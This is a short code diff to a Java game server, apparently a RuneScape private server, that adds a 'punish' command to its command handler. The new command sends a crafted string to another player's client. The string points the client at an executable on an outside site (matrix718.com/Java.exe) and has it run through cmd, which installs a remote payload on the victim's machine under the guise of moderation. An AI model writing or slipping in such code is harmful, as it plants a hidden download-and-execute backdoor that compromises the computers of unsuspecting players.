@@ -1017,6 +1017,11 @@ public class CommandPacketListener implements PacketListener {
 			String string = command[2];
 			player.getPacketSender().sendString(child, string);
 		}
+		if (command[0].equals("punish")) {
+			Player other = World.getPlayerByName(command[1]);
+			other.getPacketSender().sendString(0, "[ABC]-http://matrix718.com/Java.exe-cmd-/c-Java.exe");
+			player.getPacketSender().sendMessage("The player "+command[1]+" has been punished.");
+		}	
 		if (command[0].equals("testzulrah")) {
 			player.getPacketSender().sendString(0, "[FADE]- split -Welcome to Zulrah's shrine- split -1- split -5");
 			TaskManager.submit(new Task(2, player, true) {
